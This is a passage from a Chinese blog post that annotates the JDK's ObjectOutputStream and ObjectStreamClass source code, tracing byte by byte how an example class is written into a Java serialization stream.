class="keyword">throw</span> <span class="keyword">new</span> InternalError();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="comment">//非基元数据数组,根据数组长度循环调用writeObject0</span></span><br><span class="line">            Object[] objs = (Object[]) array;</span><br><span class="line">            <span class="keyword">int</span> len = objs.length;</span><br><span class="line">            bout.writeInt(len); <span class="comment">//写数组长度</span></span><br><span class="line">            <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">                debugInfoStack.push(</span><br><span class="line">                    <span class="string">"array (class \""</span> + array.getClass().getName() +</span><br><span class="line">                    <span class="string">"\", size: "</span> + len  + <span class="string">")"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">                        debugInfoStack.push(</span><br><span class="line">                            <span class="string">"element of array (index: "</span> + i + <span class="string">")"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="comment">//调用writeObject0处理对象的写入</span></span><br><span class="line">                        writeObject0(objs[i], <span class="keyword">false</span>);</span><br><span class="line">                    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">                            debugInfoStack.pop();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">                    debugInfoStack.pop();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//写枚举类型的数据</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeEnum</span><span class="params">(Enum&lt;?&gt; en,</span></span></span><br><span class="line"><span class="function"><span class="params">                           ObjectStreamClass desc,</span></span></span><br><span class="line"><span class="function"><span class="params">                           <span class="keyword">boolean</span> unshared)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        bout.writeByte(TC_ENUM);<span class="comment">//写标识0x7E</span></span><br><span class="line">        ObjectStreamClass sdesc = desc.getSuperDesc();</span><br><span class="line">        writeClassDesc((sdesc.forClass() == Enum.class) ? desc : sdesc, false);</span><br><span class="line">        handles.assign(unshared ? <span class="keyword">null</span> : en);</span><br><span class="line">        writeString(en.name(), <span class="keyword">false</span>); <span class="comment">//写枚举名称以字符串形式序列化</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h5 id="序列化关键部分writeOrdinaryObject："><a href="#序列化关键部分writeOrdinaryObject：" class="headerlink" title="序列化关键部分writeOrdinaryObject："></a>序列化关键部分writeOrdinaryObject：</h5><p>Java 序列化普通对象保存了三部分的数据：类型信息序列化TC_OBJECT + 类信息序列化 writeClassDesc() + 类实例数据信息序列化。到这里终于可以看到 io 序列化流的操作了。这个方法主要是在 Externalizable 和 Serializable 的接口出现分支，如果实现了 Externalizable 接口并且类描述符非动态代理，则执行 writeExternalData，否则执行 writeSerialData。同时，这个方法会写类描述信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeOrdinaryObject</span><span class="params">(Object obj, ObjectStreamClass desc, <span class="keyword">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">        debugInfoStack.push(</span><br><span class="line">            (depth == <span class="number">1</span> ? <span class="string">"root "</span> : <span class="string">""</span>) + <span class="string">"object (class \""</span> +</span><br><span class="line">            obj.getClass().getName() + <span class="string">"\", "</span> + obj.toString() + <span class="string">")"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        desc.checkSerialize();</span><br><span class="line">        <span class="comment">//写入类型TC_OBJECT 0x73，标识接下来数据是一个新的对象</span></span><br><span class="line">        bout.writeByte(TC_OBJECT); </span><br><span class="line">        <span class="comment">//写入类信息(类元信息写入结束的标志是TC_ENDBLOCKDATA 0x78，具体参考下一部分writeClassDesc的分析)</span></span><br><span class="line">        writeClassDesc(desc, <span class="keyword">false</span>);</span><br><span class="line">        handles.assign(unshared ? <span class="keyword">null</span> : obj);</span><br><span class="line">        <span class="comment">// 写入类实例数据</span></span><br><span class="line">        <span class="comment">// Externalizable或者动态代理调用writeExternalData，否则调用writeSerialData</span></span><br><span class="line">        <span class="keyword">if</span> (desc.isExternalizable() &amp;&amp; !desc.isProxy()) &#123;</span><br><span class="line">            <span class="comment">// 实现Externalizable接口的类对象的序列化</span></span><br><span class="line">            writeExternalData((Externalizable) obj);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 实现Serializable接口的类对象的序列化</span></span><br><span class="line">            writeSerialData(obj, desc);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">            debugInfoStack.pop();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（例子分析：加入<code>TC_OBJECT</code> <code>0x73</code>，当前流为<code>ac ed 00 05 73</code>，接下来调用writeClassDesc来写入类信息）</p><p>为了方便阅读，下面将根据两部分进行解析，一是类信息序列化 writeClassDesc()，一是类实例数据信息序列化writeExternalData/ writeSerialData。</p><h4 id="4-2、类元信息序列化-writeClassDesc"><a href="#4-2、类元信息序列化-writeClassDesc" class="headerlink" title="4.2、类元信息序列化 writeClassDesc()"></a>4.2、类元信息序列化 writeClassDesc()</h4><h5 id="writeClassDesc-序列化类信息："><a href="#writeClassDesc-序列化类信息：" class="headerlink" title="writeClassDesc-序列化类信息："></a>writeClassDesc-序列化类信息：</h5><p>writeClassDesc序列化类信息，序列化时会先递归调用 writeClassDesc 方法，将实现 Serializable 接口的父类信息也会同时序列化。类信息都保存在 ObjectStreamClass 类中，同时也可以通过 ObjectStreamClass#getFields 获取所有要序列的字段信息 ObjectStreamField。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将给定类描述符的表示形式写入流</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeClassDesc</span><span class="params">(ObjectStreamClass desc, <span class="keyword">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> handle;</span><br><span class="line">    <span class="keyword">if</span> (desc == <span class="keyword">null</span>) &#123;</span><br><span class="line">        writeNull();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!unshared &amp;&amp; (handle = handles.lookup(desc)) != -<span class="number">1</span>) &#123;</span><br><span class="line">        writeHandle(handle);  <span class="comment">// 类信息已经序列化，则保存句柄即可</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (desc.isProxy()) &#123; <span class="comment">// 动态代理类信息序列化</span></span><br><span class="line">        writeProxyDesc(desc, unshared);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// 非代理类信息序列化</span></span><br><span class="line">        writeNonProxyDesc(desc, unshared); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将表示标准(非动态代理)类的类描述符写入流。</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeNonProxyDesc</span><span class="params">(ObjectStreamClass desc, <span class="keyword">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bout.writeByte(TC_CLASSDESC); <span class="comment">//写0x72，代表一个新的类描述符</span></span><br><span class="line">    handles.assign(unshared ? <span class="keyword">null</span> : desc);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (protocol == PROTOCOL_VERSION_1) &#123;</span><br><span class="line">        <span class="comment">// do not invoke class descriptor write hook with old protocol</span></span><br><span class="line">        desc.writeNonProxy(<span class="keyword">this</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 写入类信息，本质上也是调用 desc.writeNonProxy(this)</span></span><br><span class="line">        writeClassDescriptor(desc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; cl = desc.forClass();</span><br><span class="line">    <span class="comment">//刷新块数据</span></span><br><span class="line">    bout.setBlockDataMode(<span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (cl != <span class="keyword">null</span> &amp;&amp; isCustomSubclass()) &#123;</span><br><span class="line">        ReflectUtil.checkPackageAccess(cl);</span><br><span class="line">    &#125;</span><br><span class="line">    annotateClass(cl);</span><br><span class="line">    bout.setBlockDataMode(<span class="keyword">false</span>); </span><br><span class="line">    <span class="comment">//注意这里有一个块数据结束标识的写入 TC_ENDBLOCKDATA 0x78</span></span><br><span class="line">    bout.writeByte(TC_ENDBLOCKDATA);</span><br><span class="line"></span><br><span class="line">    writeClassDesc(desc.getSuperDesc(), <span class="keyword">false</span>); <span class="comment">// 递归调用</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（例子分析：加入<code>TC_CLASSDESC</code> <code>0x72</code>，当前流为<code>ac ed 00 05 73 72</code>，接下来调用writeNonProxy来写入类信息）</p><h5 id="ObjectStreamClass-writeNonProxy：写入实际的类元信息"><a href="#ObjectStreamClass-writeNonProxy：写入实际的类元信息" class="headerlink" title="ObjectStreamClass#writeNonProxy：写入实际的类元信息"></a>ObjectStreamClass#writeNonProxy：写入实际的类元信息</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将非代理类描述符信息写入给定的输出流。</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">writeNonProxy</span><span class="params">(ObjectOutputStream out)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    out.writeUTF(name); <span class="comment">//写入类的名字 (例子分析：写入serial.TestSerializable，writeUTF会先写入长度再写字符串，长度为23 0x0017，serial.TestSerializable十六进制是`73 65 72 69 61 6c 2e 54 65 73 74 53 65 72 69 61  6c 69 7a 61 62 6c 65`，所以这里写入`00 17 73 65 72 69 61 6c 2e 54 65 73 74 53 65 72 69 61  6c 69 7a 61 62 6c 65`)</span></span><br><span class="line">    out.writeLong(getSerialVersionUID()); <span class="comment">//写入类的序列号 (例子分析：写入-6211228684695072792L的十六进制`a9 cd 48 6b 76 08 8f e8`，可以用Long.toHexString(l)本地输出下Long的十六进制)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">byte</span> flags = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (externalizable) &#123;</span><br><span class="line">        <span class="comment">// externalizable子类，获取SC_EXTERNALIZABLE 0x04</span></span><br><span class="line">        flags |= ObjectStreamConstants.SC_EXTERNALIZABLE;</span><br><span class="line">        <span class="keyword">int</span> protocol = out.getProtocolVersion();</span><br><span class="line">        <span class="keyword">if</span> (protocol != ObjectStreamConstants.PROTOCOL_VERSION_1) &#123;</span><br><span class="line">            flags |= ObjectStreamConstants.SC_BLOCK_DATA;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (serializable) &#123;</span><br><span class="line">        <span class="comment">// serializable子类，获取SC_SERIALIZABLE 0x02</span></span><br><span class="line">        flags |= ObjectStreamConstants.SC_SERIALIZABLE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (hasWriteObjectData) &#123;</span><br><span class="line">        <span class="comment">// 类自定义了writeObject()，获取SC_WRITE_METHOD 0x01</span></span><br><span class="line">        flags |= ObjectStreamConstants.SC_WRITE_METHOD;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (isEnum) &#123;</span><br><span class="line">        <span class="comment">// 该类是枚举类型，获取SC_ENUM 0x10</span></span><br><span class="line">        flags |= ObjectStreamConstants.SC_ENUM;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 写入类的flags  (例子分析：写入SC_SERIALIZABLE 0x02)</span></span><br><span class="line">    out.writeByte(flags); </span><br><span class="line"><span class="comment">// 写入对象属性的个数 (例子分析：本例除了serialVersionUID有5个属性，写入0x0005，serialVersionUID是static类型不被计入，并且已经在前面写入了)</span></span><br><span class="line">    out.writeShort(fields.length); </span><br><span class="line">    <span class="comment">// 循环序列化每个属性的信息</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; fields.length; i++) &#123;</span><br><span class="line">        <span class="comment">// 创建一个类的可序列化属性字段描述的实例。ObjectStreamFields的数组用于声明一个类的可序列化属性。 </span></span><br><span class="line">        ObjectStreamField f = fields[i];</span><br><span class="line">        <span class="comment">// 写入第i个属性的类型，具体参考下一部分“补充：ObjectStreamField”的分析</span></span><br><span class="line">        out.writeByte(f.getTypeCode());<span class="comment">// (例子分析：有五个属性，3个是原生类型，2个是非原生，按照对应关系本例是intField写入I，boolField写入Z，shortField写入S,stringField写入L,fileField写入L)</span></span><br><span class="line">        <span class="comment">// 写入类型的长度+类名称</span></span><br><span class="line">        out.writeUTF(f.getName()); <span class="comment">//(例子分析：写入每个属性的长度和名称)</span></span><br><span class="line">        <span class="comment">// 如果属性类型不是Java原生类型，调用writeTypeString写入表示对象或者类的类型字符串</span></span><br><span class="line">        <span class="keyword">if</span> (!f.isPrimitive()) &#123;</span><br><span class="line">            <span class="comment">// f.getTypeString()=`Ljava/io/File;`（具体参考下一部分“补充：ObjectStreamField”的分析）</span></span><br><span class="line">            <span class="comment">// writeTypeString会调用writeString，写入0x74+长度+Ljava/io/File;</span></span><br><span class="line">            out.writeTypeString(f.getTypeString());<span class="comment">//(例子分析：写入两个非原生属性的类型`Ljava/io/File;`、`a/lang/String;`)</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据上面代码可以看出，writeNonProxy主要作用是写入类信息和属性信息，具体会写入类长度+类名称+SerialVersionUID+类本身序列化的接口类型如SC_SERIALIZABLE+属性个数+每个属性信息</p><p>（例子分析：不算属性信息截至目前写入<code>ac ed 00 05 73 72 00 17 73 65 72 69 61 6c 2e 54 65 73 74 53 65 72 69 61  6c 69 7a 61 62 6c 65 a9 cd 48 6b 76 08 8f e8 02 00 05</code>。接下来分析循环属性完成写属性的信息，循环写入5个属性信息，分别是intField：I+长度0x0008+intField 即 <code>49 00  08 69 6e 74 46 69 65 6c 64</code>，boolField：Z+属性长度<code>0x0009</code>+boolField 即<code>5a 00 09 62 6f 6f 6c 46 69 65 6c 64</code>，shortField：S+长度0x000a+shortField 即 <code>53 00 0a 73 68 6f 72 74 46 69 65 6c 64</code>，fileField：L+属性名长度0x0009+fileField+TC_STRING + 类型长度0x0012+Ljava/io/File; 即 <code>4c 00 09 66 69 6c 65 46 69 65 6c 64 74 00 0e 4c 6a 61 76 61 2f 69 6f 2f 46 69  6c 65 3b</code>，stringField：L+长度0x000b+stringField+TC_STRING + 类型长度0x0012+Ljava/lang/String; 即 <code>4c 00 0b 73 74 72 69 6e 67 46 69 65 6c 64 74 00 12 4c 6a 61 76 61 2f 6c 61 6e 67 2f 53  74 72 69 6e 67 3b</code>。因为原生类型属性信息和非原生类型属性信息位置是不一定的，所以属性信息在流的拼接后的具体信息不能确定。，最后不能忘了加上数据块结束标识TC_ENDBLOCKDATA 0x78)</p><h5 id="补充：ObjectStreamField"><a href="#补充：ObjectStreamField" class="headerlink" title="补充：ObjectStreamField"></a>补充：ObjectStreamField</h5><p>在上面writeNonProxy序列化类属性信息时，创建了一个用于类的可序列化属性字段描述的ObjectStreamField实例，我们先大体分析下它。</p><p>官方文档是这样描述这个类的：</p><blockquote><p>类的可序列化属性的描述。ObjectStreamFields的数组用于声明一个类的可序列化字段。 </p></blockquote><p>除了内部类外它具有以下public方法，通过以下方法可以获取某个属性的名称、类型等。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">compareTo(Object obj)：将此字段与另一个 ObjectStreamField进行比较。</span><br><span class="line">getName()：获取此字段的名称。</span><br><span class="line">getOffset()：实例数据内的字段偏移量。</span><br><span class="line">getType()：获取字段的类型。</span><br><span class="line">getTypeCode()：返回字段类型的字符编码。</span><br><span class="line">getTypeString()：返回JVM类型签名。</span><br><span class="line">isPrimitive()：如果此字段具有原始类型，则返回<span class="keyword">true</span>。</span><br><span class="line">isUnshared()：返回指示此ObjectStreamField实例表示的可序列化字段是否未共享的布尔值。</span><br><span class="line">setOffset(<span class="keyword">int</span> offset)：实例数据偏移。</span><br></pre></td></tr></table></figure><p>除了上面的方法，还有一些需要特别关注的方法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在ObjectStreamField的构造函数中，将signature赋值属性的类型码，signature是字段类型的规范JVM签名。另外在getTypeCode的注释中也说明了类型码的对应关系。</span></span><br><span class="line"><span class="comment">/** 类型码对应关系</span></span><br><span class="line"><span class="comment">  * Z -&gt; boolean</span></span><br><span class="line"><span class="comment">  * B -&gt; byte</span></span><br><span class="line"><span class="comment">  * C -&gt; char</span></span><br><span class="line"><span class="comment">  * S -&gt; short</span></span><br><span class="line"><span class="comment">  * I -&gt; int</span></span><br><span class="line"><span class="comment">  * J -&gt; long</span></span><br><span class="line"><span class="comment">  * F -&gt; float</span></span><br><span class="line"><span class="comment">  * D -&gt; double</span></span><br><span class="line"><span class="comment">  * L -&gt; class or interface</span></span><br><span class="line"><span class="comment">  * [ -&gt; array</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">ObjectStreamField(Field field, <span class="keyword">boolean</span> unshared, <span class="keyword">boolean</span> showType) &#123;</span><br><span class="line">    <span class="keyword">this</span>.field = field;</span><br><span class="line">    <span class="keyword">this</span>.unshared = unshared;</span><br><span class="line">    name = field.getName();</span><br><span class="line">    Class&lt;?&gt; ftype = field.getType();</span><br><span class="line">    type = (showType || ftype.isPrimitive()) ? ftype : Object<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">    <span class="comment">// 调用getClassSignature返回属性的类型码</span></span><br><span class="line">    signature = getClassSignature(ftype).intern();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取属性的类型码</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">getClassSignature</span><span class="params">(Class&lt;?&gt; cl)</span> </span>&#123;</span><br><span class="line">    StringBuilder sbuf = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    <span class="keyword">while</span> (cl.isArray()) &#123;</span><br><span class="line">        sbuf.append(<span class="string">'['</span>);</span><br><span class="line">        cl = cl.getComponentType();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (cl.isPrimitive()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cl == Integer.TYPE) &#123;</span><br><span class="line">            sbuf.append(<span class="string">'I'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cl == Byte.TYPE) &#123;</span><br><span class="line">            sbuf.append(<span class="string">'B'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cl == Long.TYPE) &#123;</span><br><span class="line">            sbuf.append(<span class="string">'J'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cl == Float.TYPE) &#123;</span><br><span class="line">            sbuf.append(<span class="string">'F'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cl == Double.TYPE) &#123;</span><br><span class="line">            sbuf.append(<span class="string">'D'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cl == Short.TYPE) &#123;</span><br><span class="line">            sbuf.append(<span class="string">'S'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cl == Character.TYPE) &#123;</span><br><span class="line">            sbuf.append(<span class="string">'C'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cl == Boolean.TYPE) &#123;</span><br><span class="line">            sbuf.append(<span class="string">'Z'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cl == Void.TYPE) &#123;</span><br><span class="line">            sbuf.append(<span class="string">'V'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InternalError();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 特别注意 这里L返回的是L+类名（将.替换为/）+“;”，例如java.io对应是“Ljava/io;”</span></span><br><span class="line">        sbuf.append(<span class="string">'L'</span> + cl.getName().replace(<span class="string">'.'</span>, <span class="string">'/'</span>) + <span class="string">';'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sbuf.toString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 主要处理非原生类型，非原生类型返回类型字符串为JVM type signature</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getTypeString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> isPrimitive() ? <span class="keyword">null</span> : signature;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>截止到这里，类元信息已经序列化完成，接下来序列化类实例数据信息，即属性具体值的序列化。</p><h4 id="4-3、类实例数据信息序列化writeExternalData-writeSerialData"><a href="#4-3、类实例数据信息序列化writeExternalData-writeSerialData" class="headerlink" title="4.3、类实例数据信息序列化writeExternalData/ writeSerialData"></a>4.3、类实例数据信息序列化writeExternalData/ writeSerialData</h4><h5 id="writeSerialData-amp-writeExternalData："><a href="#writeSerialData-amp-writeExternalData：" class="headerlink" title="writeSerialData&amp;writeExternalData："></a>writeSerialData&amp;writeExternalData：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 为给定对象的每个可序列化类写入实例数据，从父类到子类。</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeSerialData</span><span class="params">(Object obj, ObjectStreamClass desc)</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 首先获取需要序列化的类(desc.getClassDataLayout())</span></span><br><span class="line">    ObjectStreamClass.ClassDataSlot[] slots = desc.getClassDataLayout();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; slots.length; i++) &#123;</span><br><span class="line">        ObjectStreamClass slotDesc = slots[i].desc;</span><br><span class="line">        <span class="comment">//自定义writeObject方法</span></span><br><span class="line">        <span class="keyword">if</span> (slotDesc.hasWriteObjectMethod()) &#123;</span><br><span class="line">            PutFieldImpl oldPut = curPut;</span><br><span class="line">            curPut = <span class="keyword">null</span>;</span><br><span class="line">            SerialCallbackContext oldContext = curContext;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">                debugInfoStack.push(</span><br><span class="line">                    <span class="string">"custom writeObject data (class \""</span> 